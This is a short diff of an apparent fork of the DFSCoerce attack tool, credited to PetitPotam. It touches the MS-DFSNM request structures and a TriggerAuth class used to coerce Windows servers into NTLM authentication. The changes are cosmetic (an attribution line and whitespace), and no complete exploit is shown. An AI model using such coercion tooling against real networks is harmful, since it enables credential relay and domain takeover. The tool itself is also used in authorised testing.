@@ -2,6 +2,7 @@
 #
 # Most of this code is stolen from PetitPotam (@topotam)
 # https://github.com/topotam/PetitPotam
+# Forked from https://github.com/Wh04m1001/DFSCoerce
 
 import sys
 import argparse
@@ -41,14 +42,16 @@ class NetrDfsRemoveStdRootResponse(NDRCALL):
     structure = (
         ('ErrorCode', ULONG),
     )
+
 class NetrDfsAddRoot(NDRCALL):
     opnum = 12
     structure = (
-         ('ServerName',WSTR),
-         ('RootShare',WSTR),
-         ('Comment',WSTR),
-         ('ApiFlags',DWORD),
+         ('ServerName', WSTR),
+         ('RootShare', WSTR),
+         ('Comment', WSTR),
+         ('ApiFlags', DWORD),
      )
+
 class NetrDfsAddRootResponse(NDRCALL):
      structure = (
          ('ErrorCode', ULONG),
@@ -90,7 +93,7 @@ class TriggerAuth():
             request.dump()
             resp = dce.request(request)
 
-        except  Exception as e:
+        except Exception as e:
             print(e)
 
 
